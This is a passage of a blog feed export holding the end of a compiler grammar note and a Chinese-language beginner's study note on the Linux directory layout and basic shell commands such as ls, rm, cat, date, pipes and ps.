王民|大学生|工人|英语</p><p>&lt;谓语&gt;::=&lt;动词&gt;&lt;直接宾语&gt;</p><p>&lt;动词&gt;::=是|学习</p><p>&lt;直接宾语&gt;::=&lt;代词&gt;|&lt;名词&gt;</p></blockquote><p><strong>3.由产生式推导句子</strong>：3.有了一组产生式之后，可以按照一定的方式用它们去推导或产生句子。</p><p>​    <strong>推导方法</strong>：从一个要识别的符号开始推导，即用相应产生式的<strong>右部</strong>来替代产生式的<strong>左部</strong>，每次仅用一条产生式去进行推导。</p><p>&lt;句子&gt;  =&gt; &lt;主语&gt;&lt;谓语&gt;</p><p>&lt;主语&gt;&lt;谓语&gt; =&gt; &lt;代词&gt;&lt;谓语&gt; </p><p>  …… ……</p><p>这种推导一直进行下去，直到所有带&lt; &gt;的符号都由终结符号替代为止。</p>]]></content>
      
      
      <categories>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Compilier </tag>
            
            <tag> StudyNote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Note</title>
      <link href="/2019/08/22/Linux-Command/"/>
      <url>/2019/08/22/Linux-Command/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-Study-Note"><a href="#Linux-Study-Note" class="headerlink" title="Linux Study Note"></a>Linux Study Note</h1><blockquote><p>参考：</p><p><a href="https://www.bilibili.com/video/av23360560?from=search&amp;seid=11213656872957708813" target="_blank" rel="noopener">黑马程序员-linux从入门到精通</a></p></blockquote><h2 id="Linux系统的文件"><a href="#Linux系统的文件" class="headerlink" title="Linux系统的文件"></a>Linux系统的文件</h2><p>linux一切皆文件</p><p>文件操作种类：创建文件、编辑文件、保存文件、关闭文件、重命名文件、删除文件、恢复文件</p><h3 id="文件目录结构"><a href="#文件目录结构" class="headerlink" title="文件目录结构"></a>文件目录结构</h3><p>Bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。</p><p>Dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要<strong>挂载（类似windows下的分配盘符</strong>。</p><p>Etc：该目录主要存储一些配置文件。</p><p>Home：表示“家”，表示<strong>除了root用户以外其他用户的家目录</strong>，类似于windows下的User/用户目录。</p><p>Proc：process，表示进程，该目录中存储的是Linux运行时候的进程。</p><p>Root：该目录是root用户自己的家目录。</p><p>Sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。</p><p>Tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。</p><p>Usr：全称是User Software Resource，注意不是user的缩写。存放的是用户自己安装的软件。类似于windows下的program files。</p><p>Var：存放的程序/系统的日志文件的目录。</p><p>Mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。</p><h2 id="Linux的基本指令"><a href="#Linux的基本指令" class="headerlink" title="Linux的基本指令"></a>Linux的基本指令</h2><p>linux指令指在linux终端（命令行）中输入的内容。</p><p>一个完整的指令的标准格式：Linux通用的格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指令主体 (空格) [选项] (空格) [操作对象]</span></span><br></pre></td></tr></table></figure><p>一个指令可以包含多个选项，操作对象也可以是多个。</p><h4 id="1-ls指令"><a href="#1-ls指令" class="headerlink" title="1.ls指令"></a>1.<code>ls</code>指令</h4><p>含义：ls（list）</p><h5 id="用法1：-ls"><a href="#用法1：-ls" class="headerlink" title="用法1：#ls"></a>用法1：#ls</h5><p>含义：列出当前工作目录下的所有文件/文件夹的名称</p><p><img src="/2019/08/22/Linux-Command/ls_1.png" alt></p><h5 id="用法2：-ls-路径"><a href="#用法2：-ls-路径" class="headerlink" title="用法2：#ls    路径"></a>用法2：#ls    路径</h5><p>含义：列出指定路径下的所有文件/文件夹的名称</p><p>路径分为相对路径和绝对路径</p><p><img src="/2019/08/22/Linux-Command/ls_2.png" alt></p><h5 id="用法3：-ls-选项-路径"><a href="#用法3：-ls-选项-路径" class="headerlink" title="用法3：#ls    选项    路径"></a>用法3：#ls    选项    路径</h5><p>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。</p><p>常见的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ls -l 路径</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls -la 路径</span></span><br></pre></td></tr></table></figure><p>选项解释：</p><p>​         -l：表示list，表示以详细列表的形式进行展示</p><p>​         -a：表示all，显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p><p><img src="/2019/08/22/Linux-Command/ls_3.png" alt="img"></p><p>上述列表中的第一列表示文档类型，<strong>其中 “ - ” 表示改行对应的文档类型为文件，“ d ” 表示文档类型为文件夹</strong>。</p><p><img src="/2019/08/22/Linux-Command/ls_4.png" alt></p><p><strong>在Linux中，隐藏文档一般以 “ . ” 开头。</strong> </p><h5 id="用法4：-ls-lh-路径"><a href="#用法4：-ls-lh-路径" class="headerlink" title="用法4：#ls    -lh    路径"></a>用法4：#ls    -lh    路径</h5><p>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以<strong>可读性较高的形式显示</strong></p><p><img src="/2019/08/22/Linux-Command/ls_5.png" alt></p><p>ls列出的结果颜色说明，<strong>其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限</strong></p><h4 id="2-pwd指令"><a href="#2-pwd指令" class="headerlink" title="2.pwd指令"></a>2.<code>pwd</code>指令</h4><p>用法：#pwd                    （print working directory，打印当前工作目录）</p><p><img src="/2019/08/22/Linux-Command/pwd.png" alt></p><h4 id="3-cd指令"><a href="#3-cd指令" class="headerlink" title="3.cd指令"></a>3.<code>cd</code>指令</h4><p>命令：#cd            （change directory，改变目录）</p><p>作用：用于切换当前的工作目录</p><h5 id="语法：-cd-路径"><a href="#语法：-cd-路径" class="headerlink" title="语法：#cd    路径"></a>语法：#cd    路径</h5><p>P.S. 在linux中有一个特殊符号~，用于表示当前用户的家目录</p><p><img src="/2019/08/22/Linux-Command/cd_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/cd_2.png" alt></p><p><img src="/2019/08/22/Linux-Command/cd_3.png" alt></p><h4 id="4-mkdir指令"><a href="#4-mkdir指令" class="headerlink" title="4.mkdir指令"></a>4.<code>mkdir</code>指令</h4><p>指令：mkdir        （make directory，创建目录）</p><h5 id="语法1：-mkdir-路径"><a href="#语法1：-mkdir-路径" class="headerlink" title="语法1：#mkdir    路径"></a>语法1：#mkdir    路径</h5><p>路径，可以是文件夹名称也可以是包含名称的一个完整路径</p><p>假如是文件夹名称，则在当前目录下创建该文件夹</p><h5 id="语法2：-mkdir-p-路径"><a href="#语法2：-mkdir-p-路径" class="headerlink" title="语法2：#mkdir    -p    路径"></a>语法2：#mkdir    -p    路径</h5><p>含义：<strong>当一次性创建多层不存在的目录的时候</strong>，添加-p参数，否则会报错</p><p><img src="/2019/08/22/Linux-Command/mkdir_1.png" alt></p><h5 id="语法3：-mkdir-路径1-路径2-路径3-…"><a href="#语法3：-mkdir-路径1-路径2-路径3-…" class="headerlink" title="语法3：#mkdir    路径1    路径2    路径3    …"></a>语法3：#mkdir    路径1    路径2    路径3    …</h5><p>表示一次性创建多个目录</p><p><img src="/2019/08/22/Linux-Command/mkdir_2.png" alt></p><h4 id="5-touch指令"><a href="#5-touch指令" class="headerlink" title="5.touch指令"></a>5.<code>touch</code>指令</h4><p>作用：创建文件</p><p>语法：#touch    文件路径</p><p>路径可以是直接的文件名也可以是路径</p><p><img src="/2019/08/22/Linux-Command/touch_1.png" alt></p><p>一次性创建多个文件</p><p><img src="/2019/08/22/Linux-Command/touch_2.png" alt></p><p><img src="/2019/08/22/Linux-Command/touch_3.png" alt></p><h4 id="6-cp指令"><a href="#6-cp指令" class="headerlink" title="6.cp指令"></a>6.<code>cp</code>指令</h4><p>指令含义：cp        （copy，复制）</p><p>作用：复制文件/文件夹到指定位置</p><h5 id="语法：-cp-被复制的文档路径-文档被复制到的路径"><a href="#语法：-cp-被复制的文档路径-文档被复制到的路径" class="headerlink" title="语法：#cp    被复制的文档路径    文档被复制到的路径"></a>语法：#cp    被复制的文档路径    文档被复制到的路径</h5><p>简单来说就是#cp    源地址    目的地址</p><p><img src="/2019/08/22/Linux-Command/cp_1.png" alt></p><p><strong>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</strong></p><p><strong>当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”（-r表示递归复制），否则目录将被忽略</strong></p><p><img src="/2019/08/22/Linux-Command/cp_2.png" alt></p><h4 id="7-mv指令"><a href="#7-mv指令" class="headerlink" title="7.mv指令"></a>7.<code>mv</code>指令</h4><p>指令含义：mv        （move，移动，剪切）</p><p>作用：移动文档到新的位置</p><h5 id="语法：-mv-需要移动的文件路径-需要保存的位置路径"><a href="#语法：-mv-需要移动的文件路径-需要保存的位置路径" class="headerlink" title="语法：#mv    需要移动的文件路径    需要保存的位置路径"></a>语法：#mv    需要移动的文件路径    需要保存的位置路径</h5><p><img src="/2019/08/22/Linux-Command/mv_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/mv_2.png" alt></p><p>注：在Linux中重命名的命令也是mv，语法和移动语法一样。</p><p><img src="/2019/08/22/Linux-Command/mv_3.png" alt></p><h4 id="8-rm指令"><a href="#8-rm指令" class="headerlink" title="8.rm指令"></a>8.<code>rm</code>指令</h4><p>指令含义：rm        （remove，移除，删除）</p><h5 id="语法：-rm-选项-需要移除的文件路径"><a href="#语法：-rm-选项-需要移除的文件路径" class="headerlink" title="语法：#rm    选项    需要移除的文件路径"></a>语法：#rm    选项    需要移除的文件路径</h5><p>选项：    -f：force，强制删除，不提示是否删除</p><p>​                -r：表示递归</p><p>在删除的时候如果不带选项，会提示是否删除，如果需要确认则输入“y/yes”，否则输入</p><p><strong>注意：如果在删除的时候不想频繁的确认，则可以在指令中添加选项“-f”，表示force（强制）。</strong></p><p><img src="/2019/08/22/Linux-Command/rm_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/rm_2.png" alt></p><p>删除一个文件夹：</p><p><img src="/2019/08/22/Linux-Command/rm_3.png" alt></p><p><strong>注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项。</strong></p><p>删除多个文件：</p><p><img src="/2019/08/22/Linux-Command/rm_4.png" alt></p><p>删除一个目录下具有公共特性的文件，例如都以Linux开头</p><p><img src="/2019/08/22/Linux-Command/rm_5.png" alt></p><p>其中<strong>*称之为通配符，意思表示任意的字符，Linux*，则表示只要文件以Linux开头，后续字符则不管</strong>。</p><h4 id="9-vim指令"><a href="#9-vim指令" class="headerlink" title="9.vim指令"></a>9.<code>vim</code>指令</h4><p>指令：vim    （Vim是一款文本编辑器，号称编辑器之神）</p><h5 id="语法：-vim-文件路径"><a href="#语法：-vim-文件路径" class="headerlink" title="语法：#vim    文件路径"></a>语法：#vim    文件路径</h5><p>作用：可以打开一个文件，文件不存在时，可以创建该文件</p><p>vim其他用法参考本文后续。</p><h4 id="10-输出重定向"><a href="#10-输出重定向" class="headerlink" title="10.输出重定向"></a>10.输出重定向</h4><p><strong>一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。</strong></p><p>>：覆输出，会覆盖掉原先的文件内容</p><p>>&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加</p><h5 id="语法：-正常执行的指令-gt-gt-gt-文件的路径"><a href="#语法：-正常执行的指令-gt-gt-gt-文件的路径" class="headerlink" title="语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径"></a>语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径</h5><p>注意：文件可以不存在，不存在则新建</p><p><img src="/2019/08/22/Linux-Command/cdx_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/cdx_2.png" alt></p><h4 id="11-cat指令"><a href="#11-cat指令" class="headerlink" title="11.cat指令"></a>11.<code>cat</code>指令</h4><p>作用1：cat有直接打开一个文件的功能。</p><h5 id="语法1：-cat-文件的路径"><a href="#语法1：-cat-文件的路径" class="headerlink" title="语法1：#cat    文件的路径"></a>语法1：#cat    文件的路径</h5><p><img src="/2019/08/22/Linux-Command/cat_1.png" alt></p><p>作用2：cat还可以对文件惊醒合并</p><h5 id="语法2：-cat-待合并的文件路径1-待合并的文件路径2-…-文件路径n-gt-合并之后的文件路径"><a href="#语法2：-cat-待合并的文件路径1-待合并的文件路径2-…-文件路径n-gt-合并之后的文件路径" class="headerlink" title="语法2：#cat    待合并的文件路径1    待合并的文件路径2    …    文件路径n    &gt;    合并之后的文件路径"></a>语法2：#cat    待合并的文件路径1    待合并的文件路径2    …    文件路径n    &gt;    合并之后的文件路径</h5><p><img src="/2019/08/22/Linux-Command/cat_2.png" alt></p><h4 id="12-df指令"><a href="#12-df指令" class="headerlink" title="12.df指令"></a>12.<code>df</code>指令</h4><p>作用：查看磁盘空间</p><h5 id="语法：-df-h"><a href="#语法：-df-h" class="headerlink" title="语法：#df    -h"></a>语法：#df    -h</h5><p>-h表示以较高可读性的形式展示大小</p><p><img src="/2019/08/22/Linux-Command/df_1.png" alt></p><h4 id="13-free指令"><a href="#13-free指令" class="headerlink" title="13.free指令"></a>13.<code>free</code>指令</h4><p>作用：查看内存使用情况</p><h5 id="语法：-free-m"><a href="#语法：-free-m" class="headerlink" title="语法：#free    -m"></a>语法：#free    -m</h5><p>-m表示以mb为单位查看</p><p><img src="/2019/08/22/Linux-Command/free_1.png" alt></p><p>剩余的真实可用的内存为1665mb。</p><p>Swap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。</p><h4 id="14-head指令"><a href="#14-head指令" class="headerlink" title="14.head指令"></a>14.<code>head</code>指令</h4><p>作用：查看一个文件的前n行，若不指定n，则默认显示前10行。</p><h5 id="语法：-head-n-文件路径"><a href="#语法：-head-n-文件路径" class="headerlink" title="语法：#head    -n    文件路径"></a>语法：#head    -n    文件路径</h5><p>n表示数字</p><p><img src="/2019/08/22/Linux-Command/head_1.png" alt></p><h4 id="15-tail指令"><a href="#15-tail指令" class="headerlink" title="15.tail指令"></a>15.<code>tail</code>指令</h4><p>作用1：查看一个文件的末n行，如果n不指定，则默认显示后10行</p><h5 id="语法：-tail-n-文件路径"><a href="#语法：-tail-n-文件路径" class="headerlink" title="语法：#tail    -n    文件路径"></a>语法：#tail    -n    文件路径</h5><p>n表示数字</p><p><img src="/2019/08/22/Linux-Command/tail_1.png" alt></p><p>作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动添加的）</p><h5 id="语法：-tail-f-文件路径"><a href="#语法：-tail-f-文件路径" class="headerlink" title="语法：#tail    -f    文件路径"></a>语法：#tail    -f    文件路径</h5><p><strong>该命令一般用于查看系统的日志比较多</strong></p><h4 id="16-less指令"><a href="#16-less指令" class="headerlink" title="16.less指令"></a>16.<code>less</code>指令</h4><p>作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车，空格键+上下方向键）查看更多</p><h5 id="语法：-less-需要查看的文件路径"><a href="#语法：-less-需要查看的文件路径" class="headerlink" title="语法：#less    需要查看的文件路径"></a>语法：#less    需要查看的文件路径</h5><p><img src="/2019/08/22/Linux-Command/less_1.png" alt></p><p>退出的时候只需要按下q键</p><h4 id="17-wc指令"><a href="#17-wc指令" class="headerlink" title="17.wc指令"></a>17.<code>wc</code>指令</h4><p>作用：统计文件内容信息（包含行数、单词数、字节数）</p><h4 id="语法：-wc-lwc-需要统计的文件路径"><a href="#语法：-wc-lwc-需要统计的文件路径" class="headerlink" title="语法：#wc    -lwc    需要统计的文件路径"></a>语法：#wc    -lwc    需要统计的文件路径</h4><p>-l：表示lines，行数</p><p>-w：表示words，单词数，依照空格来判断单词数量</p><p>-c：表示bytes，字节数</p><p><img src="/2019/08/22/Linux-Command/wc_1.png" alt></p><h4 id="18-date指令"><a href="#18-date指令" class="headerlink" title="18.date指令"></a>18.<code>date</code>指令</h4><p>作用：表示操作时间日期（读取、设置）</p><h5 id="语法1：-date"><a href="#语法1：-date" class="headerlink" title="语法1：#date"></a>语法1：#date</h5><p>输出的形式：2019年8月24日    星期六    20:13:14</p><h5 id="语法2：-date-F-（等价于-date-“-Y-m-d”）"><a href="#语法2：-date-F-（等价于-date-“-Y-m-d”）" class="headerlink" title="语法2：#date    +%F    （等价于    #date    “+%Y-%m-%d”）"></a>语法2：#date    +%F    （等价于    #date    “+%Y-%m-%d”）</h5><p>输出形式：2019-08-24</p><h5 id="语法3：-date-“-F-T”-（等价于-date-“-Y-m-d-H-M-S”）"><a href="#语法3：-date-“-F-T”-（等价于-date-“-Y-m-d-H-M-S”）" class="headerlink" title="语法3：#date    “+%F  %T”    （等价于    #date    “+%Y-%m-%d    %H:%M:%S”）"></a>语法3：#date    “+%F  %T”    （等价于    #date    “+%Y-%m-%d    %H:%M:%S”）</h5><p>引号表示让“年月日与时分秒”成为一个不可分割的整体</p><p>输出的形式：2019-08-24    20:13:14</p><h5 id="语法4：-date-d-“-1-day”-“-Y-m-d-H-M-S”"><a href="#语法4：-date-d-“-1-day”-“-Y-m-d-H-M-S”" class="headerlink" title="语法4：#date    -d    “-1  day”    “+%Y-%m-%d  %H:%M:%S”"></a>语法4：#date    -d    “-1  day”    “+%Y-%m-%d  %H:%M:%S”</h5><p>用于获取之前或者之后的某个时间（备份）</p><p>符号的可选值：+（之后）、-（之前）</p><p>单位的可选值：day（天）、month（月份）、year（年）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">F：表示完整的年月日</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">T：表示完整的时分秒</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">Y：表示四位年份</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">m：表示两位月份（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">d：表示日期（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">H：表示小时（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">M：表示分钟（带前导0）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">S：表示秒数（带前导0）</span></span><br><span class="line"></span><br><span class="line">(以下摘自#date --help)</span><br><span class="line"><span class="meta">  %</span><span class="bash">%一个文字的 %</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">a当前locale 的星期名缩写(例如： 日，代表星期日)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">A当前locale 的星期名全称 (如：星期日)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">b当前locale 的月名缩写 (如：一，代表一月)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">B当前locale 的月名全称 (如：一月)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">c当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">C世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">d按月计的日期(例如：01)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">D按月计的日期；等于%m/%d/%y</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">e按月计的日期，添加空格，等于%_d</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">F完整日期格式，等价于 %Y-%m-%d</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">gISO-8601 格式年份的最后两位 (参见%G)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">GISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">h等于%b</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">H小时(00-23)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">I小时(00-12)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">j按年计的日期(001-366)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">k   hour, space padded ( 0..23); same as %_H</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">l   hour, space padded ( 1..12); same as %_I</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">m   month (01..12)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">M   minute (00..59)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">n换行</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">N纳秒(000000000-999999999)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">p当前locale 下的<span class="string">"上午"</span>或者<span class="string">"下午"</span>，未知时输出为空</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">P与%p 类似，但是输出小写字母</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">r当前locale 下的 12 小时时钟时间 (如：11:11:04 下午)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">R24 小时时间的时和分，等价于 %H:%M</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">s自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">S秒(00-60)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">t输出制表符 Tab</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">T时间，等于%H:%M:%S</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">u星期，1 代表星期一</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">U一年中的第几周，以周日为每星期第一天(00-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">VISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">w一星期中的第几日(0-6)，0 代表周一</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">W一年中的第几周，以周一为每星期第一天(00-53)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">x当前locale 下的日期描述 (如：12/31/99)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">X当前locale 下的时间描述 (如：23:13:48)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">y年份最后两位数位 (00-99)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">Y年份</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">z +hhmm数字时区(例如，-0400)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">:z +hh:mm数字时区(例如，-04:00)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">::z +hh:mm:ss数字时区(例如，-04:00:00)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">:::z数字时区带有必要的精度 (例如，-04，+05:30)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">Z按字母表排序的时区缩写 (例如，EDT)</span></span><br></pre></td></tr></table></figure></p><h4 id="19-cal指令"><a href="#19-cal指令" class="headerlink" title="19.cal指令"></a>19.<code>cal</code>指令</h4><p>作用：用来操作日历的</p><h5 id="语法1：-cal-（等价于-cal-l）"><a href="#语法1：-cal-（等价于-cal-l）" class="headerlink" title="语法1：#cal                （等价于#cal    -l）"></a>语法1：#cal                （等价于#cal    -l）</h5><p>直接输出当前月份日历</p><h5 id="语法2：-cal-3"><a href="#语法2：-cal-3" class="headerlink" title="语法2：#cal    -3"></a>语法2：#cal    -3</h5><p>表示输出上一个月+本月+下个月的日历</p><h5 id="语法3：-cal-y-年份"><a href="#语法3：-cal-y-年份" class="headerlink" title="语法3：#cal    -y    年份"></a>语法3：#cal    -y    年份</h5><p>表示输出某一个年份的日历</p><h4 id="20-clear-ctrl-L-指令"><a href="#20-clear-ctrl-L-指令" class="headerlink" title="20.clear  |  (ctrl+L)   指令"></a>20.<code>clear</code>  |  <code>(ctrl+L)</code>   指令</h4><p>作用：清除终端中已经存在的命令和结果（信息）</p><h5 id="语法：-clear-或-快捷键-ctrl-L"><a href="#语法：-clear-或-快捷键-ctrl-L" class="headerlink" title="语法：#clear        或         快捷键 ctrl  +  L"></a>语法：#clear        或         快捷键 ctrl  +  L</h5><p>注意：该命令并不是真的清除了之前的信息，而是把之前的信息都隐藏到了最上面，可以通过滚动条继续查看以前的信息。</p><h4 id="21-管道pipe"><a href="#21-管道pipe" class="headerlink" title="21.管道pipe"></a>21.管道pipe</h4><h5 id="管道符："><a href="#管道符：" class="headerlink" title="管道符：    |"></a>管道符：    |</h5><p>作用：管道一般可以用于“<strong>过滤</strong>”，“特殊”，“扩展处理”</p><h5 id="语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用"><a href="#语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用" class="headerlink" title="语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用"></a>语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用<strong>主要是辅助作用</strong></h5><p><strong>①过滤</strong>案例（<strong>高频率使用</strong>）：需要通过管道查询出根目录下包含“y”字母的文档名称。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ls| grep y</span></span><br><span class="line"></span><br><span class="line">针对上面这个命令说明：</span><br><span class="line">①以管道作为分界线，前面的命令有个输出，后面需要先输入，然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入；</span><br><span class="line">②grep指令：主要用于过滤</span><br></pre></td></tr></table></figure><p>②特殊用法案例：通过管道的操作方法来实现<code>less</code>的等价效果（了解）</p><p>之前通过less查看一个文件，可以<code>#less</code> 路径</p><p>现在通过管道还可以这么：<code>#cat 路径|less</code></p><p>③扩展处理：统计某个目录下的文档的总个数？</p><p><strong>答：#ls / | wc -l</strong></p><h4 id="22-hostname指令"><a href="#22-hostname指令" class="headerlink" title="22.hostname指令"></a>22.<code>hostname</code>指令</h4><p>作用：操作服务器的主机名（读取or设置）</p><h5 id="语法1：-hostname"><a href="#语法1：-hostname" class="headerlink" title="语法1：#hostname"></a>语法1：#hostname</h5><p>含义：表示输出完整的主机名</p><p>语法2：#hostname    -f</p><p>含义：表示输出当前主机名中的FQDN（全限定域名）</p><p><img src="/2019/08/22/Linux-Command/hostname_1.png" alt></p><h4 id="23-id指令"><a href="#23-id指令" class="headerlink" title="23.id指令"></a>23.<code>id</code>指令</h4><p>作用：查看一个用户的一些基本信息（包含用户id，用户组id，附加组id…），该指令如果不指定用户则默认当前用户。</p><h5 id="语法1：-id"><a href="#语法1：-id" class="headerlink" title="语法1：#id"></a>语法1：#id</h5><p>默认显示当前执行该命令的用户的基本信息</p><h5 id="语法2：-id-username"><a href="#语法2：-id-username" class="headerlink" title="语法2：#id    username"></a>语法2：#id    username</h5><p>显示指定账户（username）的基本信息</p><p><img src="/2019/08/22/Linux-Command/id_1.png" alt></p><p>验证用户信息可通过文件（<code>/etc/passwd</code>）</p><p>验证用户组信息可通过文件（<code>/etv/group</code>）</p><h4 id="24-whoami指令"><a href="#24-whoami指令" class="headerlink" title="24.whoami指令"></a>24.<code>whoami</code>指令</h4><p>作用：“我是谁？”，显示当前登录的用户名，<strong>一般用于shell脚本，用于获取当前操作系统的用户名方便记录日志。</strong></p><h5 id="语法：-whoami"><a href="#语法：-whoami" class="headerlink" title="语法：#whoami"></a>语法：#whoami</h5><p><img src="/2019/08/22/Linux-Command/whoami.png" alt></p><h4 id="25-ps-ef指令"><a href="#25-ps-ef指令" class="headerlink" title="25.ps -ef指令"></a>25.<code>ps -ef</code>指令</h4><p>指令：ps</p><p>作用：用于查看服务器进程信息</p><p>选项含义：</p><p>​    -e：等价于“-A”，表示列出全部的进程</p><p>​    -f：显示全部的列（显示全字段）</p><p><img src="/2019/08/22/Linux-Command/ps_1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 